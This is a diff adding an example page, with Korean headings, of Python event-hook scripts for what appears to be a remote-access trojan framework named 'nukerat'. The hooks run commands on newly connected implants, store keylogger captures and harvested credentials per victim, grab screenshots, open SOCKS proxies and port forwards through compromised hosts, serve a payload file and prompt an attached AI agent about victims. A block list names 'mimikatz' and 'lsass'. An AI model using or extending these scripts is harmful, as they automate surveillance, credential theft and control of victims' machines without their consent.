@@ -1,0 +1,227 @@
+---
+title: 예제
+---
+
+## 새 임플란트에서 동기·비동기 명령 실행
+
+```python
+def format_host(host):
+    user = host.get("user", "?")
+    name = host.get("hostname", host["tag"])
+    return f"[+] new implant: {user} @ {name}"
+
+def on_connect(host):
+    echo(format_host(host))
+    cmd(host["tag"], "whoami")
+    async_cmd(host["tag"], "hostname")
+
+event.new_host:on_connect()
+```
+
+## 호스트가 제거될 때 알림
+
+```python
+import json
+import os
+
+def on_removed(host):
+    path = f"/tmp/nukerat/removed/{host['tag']}.json"
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w") as f:
+        json.dump(host, f, default=str)
+    message_box("Host removed", host["tag"], type="info")
+
+event.removed_host:on_removed()
+```
+
+## 만료된 호스트 로깅
+
+```python
+def on_expired(host):
+    echo(f"{host['tag']} missed check in ({host.get('user', '?')})")
+
+event.expired_host:on_expired()
+```
+
+## 차단 목록으로 큐 필터링
+
+```python
+def filter_task(task):
+    blocked = ["mimikatz", "lsass"]
+    text = (task.get("input") or "").lower()
+    if any(w in text for w in blocked):
+        reject_cmd(task["tag"])
+    else:
+        approve_cmd(task["tag"])
+
+event.new_queue_line:filter_task()
+```
+
+## 임플란트 오류를 출력으로 에코
+
+```python
+def on_fail(task):
+    echo(f"error on {task['host']}: {task.get('error', '?')}")
+
+event.implant_error:on_fail()
+```
+
+## 사용자 지정 응답으로 작업 완료
+
+```python
+def on_done(task):
+    msg = f"done: {(task.get('input') or '')[:80]}"
+    conclude(task["tag"], msg)
+
+event.task_completed:on_done()
+```
+
+## 체크인 및 호스트 수 로깅
+
+```python
+def on_checkin(row):
+    echo(f"checkin {row['type']} from {row['host']}")
+
+event.new_checkin:on_checkin()
+```
+
+## 키로거 줄 저장 및 모든 항목 나열
+
+```python
+import os
+
+def on_keys(entry):
+    path = f"/tmp/nukerat/keys/{entry['host_tag']}/{entry['tag']}.txt"
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w") as f:
+        f.write(entry["content"])
+    echo(f"keylogs in db: {len(keylogs())}")
+
+event.keylogger_update:on_keys()
+```
+
+## 폴더 탐색기 데이터 업데이트 시 원격 폴더 나열
+
+```python
+def on_folder(row):
+    path = (row.get("path") or "").replace("\\\\", "/")
+    folders(row["host"], path)
+
+event.folders_update:on_folder()
+```
+
+## 프로세스 데이터 변경 시 프로세스 트리 요청
+
+```python
+def on_process(row):
+    process(row["host"])
+    echo(f"process tree requested for {row['host']}")
+
+event.process_update:on_process()
+```
+
+## 터미널 출력을 일별 로그에 추가
+
+```python
+import os
+from datetime import date
+
+def log_output(line):
+    path = f"/tmp/nukerat/logs/{date.today()}.log"
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "a") as f:
+        f.write(f"[{line['host']}] {line['output']}\n")
+
+event.output_received:log_output()
+```
+
+## 저장 및 정리 시 자격 증명 관리
+
+```python
+def on_cred(cred):
+    message_box("Credential", f"{cred['name']} on {cred['host']}", type="success")
+    echo(f"total credentials: {len(credentials())}")
+    tag = credentials.add("backup", cred["host"], "auto copy", cred["content"])
+    credentials.remove(tag)
+
+event.credentials_update:on_cred()
+```
+
+## 새 리스너에서 SOCKS 및 포트 포워드 열기
+
+```python
+def on_listener(row):
+    if row["type"] != "http":
+        return
+    hosts = db.hosts()
+    if not hosts:
+        return
+    tag = hosts[0]["tag"]
+    network.add_socks(tag, 1080)
+    network.add_forward(tag, 8080, '127.0.0.1', 80)
+
+event.listeners_update:on_listener()
+```
+
+## 타이머로 네트워크 세션 재시작 및 제거
+
+```python
+def manage_net(_):
+    for row in db.listeners():
+        if row["type"] not in ("socks", "port_forwarding"):
+            continue
+        echo(network.restart(row["tag"]))
+        echo(network.remove(row["tag"]))
+        return
+
+event.heartbeat_60m:manage_net()
+```
+
+## 파일 서버에서 파일 업로드 및 삭제
+
+```python
+def file_ops(_):
+    file_server.upload(8080, "/opt/payload.bin")
+    file_server.delete(8080, "old.bin")
+
+event.heartbeat_1d:file_ops()
+```
+
+## 일정에 따라 AI 에이전트에 프롬프트 전송
+
+```python
+def ask_agent(_):
+    agents = db.agents()
+    if agents:
+        agent(agents[0]["tag"], "Summarize active hosts.")
+
+event.heartbeat_12h:ask_agent()
+```
+
+## 최초 연결 시 스크린샷 캡처
+
+```python
+from pathlib import Path
+
+def grab_screen(host):
+    out = Path("/tmp/nukerat/screens") / f"{host['tag']}.png"
+    out.parent.mkdir(parents=True, exist_ok=True)
+    screenshot(host["tag"], output=str(out))
+    echo(f"saved {out}")
+
+event.new_host:grab_screen()
+```
+
+## 데이터베이스에서 큐 행 조회
+
+```python
+import json
+
+def dump_queue(_):
+    rows = db.queue()
+    echo(f"queue size: {len(rows)}")
+    with open("/tmp/nukerat/queue.json", "w") as f:
+        json.dump(rows[:10], f, default=str)
+
+event.heartbeat_5m:dump_queue()
+```
